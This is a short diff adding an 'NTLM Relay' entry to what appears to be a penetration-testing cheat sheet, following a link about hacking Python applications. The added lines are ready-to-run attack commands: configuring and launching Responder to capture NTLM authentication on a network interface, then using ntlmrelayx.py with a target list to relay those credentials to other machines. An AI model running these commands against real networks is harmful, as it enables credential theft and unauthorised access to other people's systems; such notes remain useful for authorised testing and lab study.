@@ -769,3 +769,10 @@ X-Host : IP
 
 [Hacking Python]
 https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1
+
+[NTLM Relay]
+# if you cant crack the NTLMv2 hash, then relay it!
+* turn off http,smb in /etc/Responder.conf
+Responder -I tun0 -rdvw
+* Create a targets.txt containing list of targets ip (i.e. all://10.10.10.10)
+ntlmrelayx.py -tf targets.txt -sm3support
